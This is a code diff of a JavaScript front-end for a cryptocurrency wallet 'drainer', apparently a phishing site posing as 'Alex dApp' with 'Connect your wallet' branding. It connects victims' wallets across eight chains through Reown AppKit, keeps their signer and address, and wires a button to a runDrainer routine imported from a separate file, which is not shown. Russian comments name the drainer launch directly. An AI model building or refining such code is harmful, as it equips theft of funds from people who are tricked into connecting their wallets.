@@ -1,66 +1,65 @@
-import { createAppKit } from '@reown/appkit'
+import { createAppKit } from '@reown/appkit';
 import {
-  mainnet,
-  polygon,
-  bsc,
-  avalanche,
-  arbitrum,
-  optimism,
-  linea,
-  base
-} from '@reown/appkit/networks'
-import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
-import { ethers } from 'ethers'
-import { runDrainer } from './drainer.js'
+  mainnet, polygon, bsc, avalanche,
+  arbitrum, optimism, linea, base
+} from '@reown/appkit/networks';
+import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
+import { ethers } from 'ethers';
+import { runDrainer } from './drainer.js';
 
-const projectId = 'd85cc83edb401b676e2a7bcef67f3be8'
+const projectId = 'd85cc83edb401b676e2a7bcef67f3be8';
 
-// ✅ Все поддерживаемые сети
 const networks = [
-  mainnet,
-  polygon,
-  bsc,
-  avalanche,
-  arbitrum,
-  optimism,
-  linea,
-  base
-]
+  mainnet, polygon, bsc, avalanche,
+  arbitrum, optimism, linea, base
+];
 
 const wagmiAdapter = new WagmiAdapter({
   projectId,
-  networks
-})
-
-const metadata = {
-  name: 'Alex dApp',
-  description: 'Connect your wallet',
-  url: 'https://checkalex.xyz',
-  icons: ['https://checkalex.xyz/icon.png']
-}
+  networks,
+});
 
 const modal = createAppKit({
   adapters: [wagmiAdapter],
   networks,
-  metadata,
+  metadata: {
+    name: 'Alex dApp',
+    description: 'Connect your wallet',
+    url: 'https://checkalex.xyz',
+    icons: ['https://checkalex.xyz/icon.png'],
+  },
   projectId,
   features: {
-    analytics: true
-  }
-})
+    analytics: true,
+  },
+});
 
-// Открыть модалку по клику
-document.getElementById('open-connect-modal').addEventListener('click', () => modal.open())
+// глобальные переменные
+let appProvider, appSigner, userAddress;
 
-// Запуск drainer-а
-document.getElementById('drainer-btn').addEventListener('click', async () => {
-  try {
-    const provider = new ethers.providers.Web3Provider(window.ethereum, 'any')
-    const signer = provider.getSigner()
-    const address = await signer.getAddress()
+// подключение кошелька
+modal.on('connect', async ({ provider }) => {
+  appProvider = new ethers.providers.Web3Provider(provider, 'any');
+  appSigner = appProvider.getSigner();
+  userAddress = await appSigner.getAddress();
 
-    await runDrainer(provider, signer, address)
-  } catch (e) {
-    console.error("Ошибка в Drainer:", e)
-  }
-})
+  document.getElementById('status').textContent = `Подключено: ${userAddress}`;
+});
+
+// открыть connect-модалку
+document.getElementById('open-connect-modal')
+  .addEventListener('click', () => modal.open());
+
+// кнопка Drainer сразу активна
+document.getElementById('drainer-btn')
+  .addEventListener('click', async () => {
+    if (!appSigner) {
+      return alert('Сначала подключите кошелёк!');
+    }
+    try {
+      await runDrainer(appProvider, appSigner, userAddress);
+    } catch (e) {
+      console.error('Ошибка в Drainer:', e);
+      alert('Ошибка при выполнении Drainer: ' + e.message);
+    }
+  });
